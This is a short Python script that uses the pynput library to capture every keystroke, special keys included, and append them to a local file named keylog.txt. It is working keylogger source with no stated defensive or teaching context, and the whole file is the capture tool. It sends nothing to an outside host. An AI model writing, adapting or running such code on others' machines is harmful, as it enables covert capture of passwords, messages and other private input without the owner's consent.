from pynput import keyboard

log_file = "keylog.txt"
current_input = ""

def on_press(key):
    global current_input

    try:
        # Regular characters (letters, numbers, and symbols)
        if hasattr(key, 'char') and key.char is not None:
            current_input += key.char
            with open(log_file, "a") as f:
                f.write(key.char)
        else:
            # Handle special keys
            if key == keyboard.Key.space:
                current_input += ' '  # Handle space
                with open(log_file, "a") as f:
                    f.write(' ')
            elif key == keyboard.Key.enter:
                current_input += '\n'  # Handle Enter
                with open(log_file, "a") as f:
                    f.write('[Enter]\n')
            elif key == keyboard.Key.backspace:
                current_input = current_input[:-1]  # Remove the last character on backspace
                with open(log_file, "a") as f:
                    f.write('[Backspace]')
            elif key == keyboard.Key.shift:
                with open(log_file, "a") as f:
                    f.write('[Shift]')
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                with open(log_file, "a") as f:
                    f.write('[Ctrl]')
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                with open(log_file, "a") as f:
                    f.write('[Alt]')
            elif key == keyboard.Key.cmd:
                with open(log_file, "a") as f:
                    f.write('[Cmd]')
            else:
                # For other special keys
                with open(log_file, "a") as f:
                    f.write(f'[{key}]')

    except AttributeError:
        # Handling case where key doesn't have a 'char' attribute (like function keys)
        with open(log_file, "a") as f:
            f.write(f'[{key}]')

# Listener for key press
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
